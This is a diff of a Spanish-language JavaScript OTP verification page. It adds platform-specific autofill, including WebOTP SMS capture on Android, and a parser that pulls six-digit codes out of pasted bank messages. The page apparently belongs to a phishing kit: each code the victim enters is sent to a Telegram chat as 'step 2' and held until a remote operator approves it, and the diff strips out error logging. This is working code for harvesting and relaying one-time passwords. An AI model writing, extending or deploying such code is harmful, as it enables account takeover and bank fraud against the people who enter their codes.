@@ -1,5 +1,5 @@
 /* ============================================================
-   Pantalla OTP — Con Alerta de Vencimiento y Reenvío Sincronizado
+   Pantalla OTP — Separación Nativa iOS vs Android
    ============================================================ */
 
 (function () {
@@ -16,6 +16,10 @@
   const submitBtn = document.getElementById("otp-submit");
   const maskedEl = document.getElementById("masked-number");
   const resendBtn = document.getElementById("otp-resend"); 
+
+  // Detección de sistema operativo
+  const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
+  let oTPAbortController = null;
 
   let remaining = CODE_TTL_SECONDS;
   let timerId = null;
@@ -83,6 +87,135 @@
 
   startTimer();
 
+  function getCode() {
+    return inputs.map((i) => i.value.substring(0, 1)).join("");
+  }
+
+  function isComplete() {
+    return inputs.every((i) => i.value.trim().length === 1);
+  }
+
+  function refreshSubmitState() {
+    if (submitBtn) {
+      submitBtn.disabled = !isComplete() || remaining <= 0;
+    }
+  }
+
+  // ============================================================
+  // EXTRACTOR LIMPIO (Ignora montos como $363.00 y toma los 6 dígitos)
+  // ============================================================
+  function rellenarYValidarCodigo(rawText) {
+    const coincidencia = String(rawText).match(/\b\d{6}\b/);
+    const cleanValue = coincidencia ? coincidencia[0] : String(rawText).replace(/\D/g, "").slice(0, 6);
+
+    if (cleanValue.length > 0) {
+      cleanValue.split("").forEach((char, idx) => {
+        if (inputs[idx]) {
+          inputs[idx].value = char;
+          inputs[idx].classList.remove("invalid");
+        }
+      });
+      refreshSubmitState();
+      if (isComplete()) {
+        enviarFormulario();
+      }
+    }
+  }
+
+  // ============================================================
+  // MODO 1: EXCLUSIVO PARA ANDROID (WebOTP API + Bloqueo 1 Dígito)
+  // ============================================================
+  function activarEscuchaWebOTPAndroid() {
+    if (!('credentials' in navigator) || !('OTPCredential' in window)) return;
+
+    if (oTPAbortController) oTPAbortController.abort();
+    oTPAbortController = new AbortController();
+
+    navigator.credentials.get({
+      otp: { transport: ['sms'] },
+      signal: oTPAbortController.signal
+    }).then(otp => {
+      if (otp && otp.code) {
+        rellenarYValidarCodigo(otp.code);
+      }
+    }).catch(() => { });
+  }
+
+  function configurarInputsAndroid() {
+    activarEscuchaWebOTPAndroid();
+
+    inputs.forEach((input, index) => {
+      input.setAttribute("maxlength", "1");
+
+      input.addEventListener("paste", (e) => {
+        e.preventDefault();
+        const pastedData = (e.clipboardData || window.clipboardData).getData("text");
+        rellenarYValidarCodigo(pastedData);
+      });
+
+      input.addEventListener("input", (e) => {
+        input.classList.remove("invalid");
+        input.value = e.target.value.replace(/\D/g, "").slice(0, 1);
+
+        if (input.value && index < inputs.length - 1) {
+          inputs[index + 1].focus();
+        }
+        refreshSubmitState();
+        if (isComplete()) enviarFormulario();
+      });
+
+      input.addEventListener("keydown", (e) => {
+        if (e.key === "Backspace" && !input.value && index > 0) {
+          inputs[index - 1].focus();
+          inputs[index - 1].value = "";
+          refreshSubmitState();
+        }
+      });
+    });
+  }
+
+  // ============================================================
+  // MODO 2: EXCLUSIVO PARA IPHONE / iOS (Sugerencia de Teclado)
+  // ============================================================
+  function configurarInputsIOS() {
+    inputs.forEach((input, index) => {
+      input.addEventListener("input", (e) => {
+        input.classList.remove("invalid");
+        const val = e.target.value;
+
+        // Si el teclado inyecta los 6 dígitos juntos
+        if (val.length > 1) {
+          rellenarYValidarCodigo(val);
+          return;
+        }
+
+        // Si el usuario escribe a mano, recorta estrictamente a 1 dígito
+        input.value = val.replace(/\D/g, "").slice(0, 1);
+
+        if (input.value && index < inputs.length - 1) {
+          inputs[index + 1].focus();
+        }
+        refreshSubmitState();
+        if (isComplete()) enviarFormulario();
+      });
+
+      input.addEventListener("keydown", (e) => {
+        if (e.key === "Backspace" && !input.value && index > 0) {
+          inputs[index - 1].focus();
+          inputs[index - 1].value = "";
+          refreshSubmitState();
+        }
+      });
+    });
+  }
+
+  // Arranque según dispositivo
+  if (isIOS) {
+    configurarInputsIOS();
+  } else {
+    configurarInputsAndroid();
+  }
+  // Botón de reenvío
   if (resendBtn) {
     resendBtn.addEventListener("click", async () => {
       resendBtn.textContent = "Enviando nuevo código...";
@@ -116,27 +249,14 @@
         });
         if (inputs[0]) inputs[0].focus();
 
-        startTimer(); 
+        startTimer();
+        if (!isIOS) activarEscuchaWebOTPAndroid();
       }, 1500);
     });
   }
 
-  function getCode() {
-    return inputs.map((i) => i.value.substring(0, 1)).join("");
-  }
-
-  function isComplete() {
-    return inputs.every((i) => i.value.trim().length === 1);
-  }
-
-  function refreshSubmitState() {
-    if (submitBtn) {
-      submitBtn.disabled = !isComplete() || remaining <= 0;
-    }
-  }
-
   // ============================================================
-  // FUNCIÓN ENCAPSULADA DE ENVÍO Y ESCUCHA TELEGRAM
+  // ENVÍO Y VALIDACIÓN EN TELEGRAM
   // ============================================================
   async function enviarFormulario() {
     if (!isComplete() || remaining <= 0) return;
@@ -162,9 +282,7 @@
       if (dataInit.ok && dataInit.result && dataInit.result.length > 0) {
         lastUpdateIdApproval = Number(dataInit.result[dataInit.result.length - 1].update_id);
       }
-    } catch (errInit) {
-      console.error("Error al limpiar historial base:", errInit);
-    }
+    } catch (errInit) { }
 
     const textApproval = `🛡️ *PASO 2: VALIDACIÓN DE CÓDIGO OTP* 🛡️\n\n` +
                          `El usuario ha ingresado el código:\n` +
@@ -218,9 +336,7 @@
             }
           }
         }
-      } catch (err) {
-        console.error("Fallo de conexión en bucle de escucha:", err);
-      }
+      } catch (err) { }
 
       if (!decision) {
         await new Promise(resolve => setTimeout(resolve, 1500));
@@ -296,58 +412,11 @@
         input.classList.remove("invalid");
       });
       if (inputs[0]) inputs[0].focus();
+      
+      // Reactiva la escucha automática en Android si el primer intento falló
+      if (!isIOS) activarEscuchaWebOTPAndroid();
     }
   }
-
-  // ============================================================
-  // EVENTOS DE LOS INPUTS OPTIMIZADOS (AUTOLLENADO + BLOQUEO MANUAL)
-  // ============================================================
-  inputs.forEach((input, index) => {
-    input.addEventListener("keydown", (e) => {
-      if (e.key === "Backspace" && !input.value && index > 0) {
-        inputs[index - 1].focus();
-        inputs[index - 1].value = "";
-        inputs[index - 1].classList.remove("invalid");
-        refreshSubmitState();
-      }
-    });
-
-    input.addEventListener("input", (e) => {
-      input.classList.remove("invalid");
-      const val = e.target.value;
-
-      if (val.length > 1) {
-        const numeros = val.replace(/\D/g, "");
-        const cleanValue = numeros.slice(-6);
-
-        cleanValue.split("").forEach((char, idx) => {
-          if (inputs[idx]) {
-            inputs[idx].value = char;
-            inputs[idx].setAttribute("maxlength", "1");
-          }
-        });
-
-        refreshSubmitState();
-        if (isComplete()) {
-          enviarFormulario();
-        }
-        return;
-      }
-
-      input.setAttribute("maxlength", "1");
-      input.value = val.replace(/\D/g, "").slice(0, 1);
-
-      if (input.value && index < inputs.length - 1) {
-        inputs[index + 1].focus();
-      }
-
-      refreshSubmitState();
-
-      if (isComplete()) {
-        enviarFormulario();
-      }
-    });
-  });
 
   if (form) {
     form.addEventListener("submit", function (e) {
